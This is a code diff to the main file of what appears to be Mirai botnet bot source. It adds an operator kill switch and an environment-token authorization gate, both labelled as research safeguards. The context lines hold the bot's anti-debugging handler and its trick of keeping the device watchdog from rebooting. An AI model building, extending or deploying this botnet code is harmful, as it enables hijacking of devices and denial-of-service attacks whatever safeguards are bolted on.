@@ -31,6 +31,60 @@ static void teardown_connection(void);
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
+/* ── Ethical Research Kill Switch ──────────────────────────────────────────
+ * Sending SIGUSR1 to the bot process triggers a clean shutdown via the
+ * attack_running flag checked by attack_should_continue() in all attack
+ * modules.  This is an operator-controlled emergency stop mechanism.
+ */
+extern volatile int attack_running; /* defined in attack.c */
+
+static void kill_switch_handler(int sig)
+{
+    (void)sig;
+    attack_running = 0; /* Stops all attack_should_continue() loops */
+#ifdef DEBUG
+    printf("[main] Kill switch triggered via SIGUSR1 — stopping all attacks\n");
+#endif
+}
+
+/* ── Research Authorization Check ──────────────────────────────────────────
+ * If compiled with RESEARCH_MODE, the bot verifies a MIRAI_AUTH_TOKEN env
+ * variable matches the compiled-in token before proceeding. This prevents
+ * unauthorized deployment of research builds.
+ */
+#ifdef RESEARCH_MODE
+#ifndef MIRAI_AUTH_TOKEN
+#define MIRAI_AUTH_TOKEN "MIRAI2026-RESEARCH-UNAUTHORIZED"
+#endif
+static BOOL check_research_auth(void)
+{
+    const char *token = getenv("MIRAI_AUTH_TOKEN");
+    if (token == NULL) {
+#ifdef DEBUG
+        printf("[main] RESEARCH_MODE: MIRAI_AUTH_TOKEN env var not set — aborting\n");
+#endif
+        return FALSE;
+    }
+    /* Simple string comparison — token should be set at deployment time */
+    size_t i = 0;
+    const char *expected = MIRAI_AUTH_TOKEN;
+    while (expected[i] && token[i]) {
+        if (expected[i] != token[i]) {
+#ifdef DEBUG
+            printf("[main] RESEARCH_MODE: Invalid auth token — aborting\n");
+#endif
+            return FALSE;
+        }
+        i++;
+    }
+    if (expected[i] != token[i]) return FALSE;
+#ifdef DEBUG
+    printf("[main] RESEARCH_MODE: Auth token verified OK\n");
+#endif
+    return TRUE;
+}
+#endif /* RESEARCH_MODE */
+
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
 BOOL pending_connection = FALSE;
@@ -53,6 +107,13 @@ int main(int argc, char **args)
     int tbl_exec_succ_len;
     int pgid, pings = 0;
 
+#ifdef RESEARCH_MODE
+    /* Authorization gate — must pass before any bot logic executes */
+    if (!check_research_auth()) {
+        return EXIT_FAILURE;
+    }
+#endif
+
 #ifndef DEBUG
     sigset_t sigs;
     int wfd;
@@ -66,6 +127,8 @@ int main(int argc, char **args)
     sigprocmask(SIG_BLOCK, &sigs, NULL);
     signal(SIGCHLD, SIG_IGN);
     signal(SIGTRAP, &anti_gdb_entry);
+    /* Kill switch: operator sends SIGUSR1 to halt all attacks */
+    signal(SIGUSR1, &kill_switch_handler);
 
     // Prevent watchdog from rebooting device
     if ((wfd = open("/dev/watchdog", 2)) != -1 ||
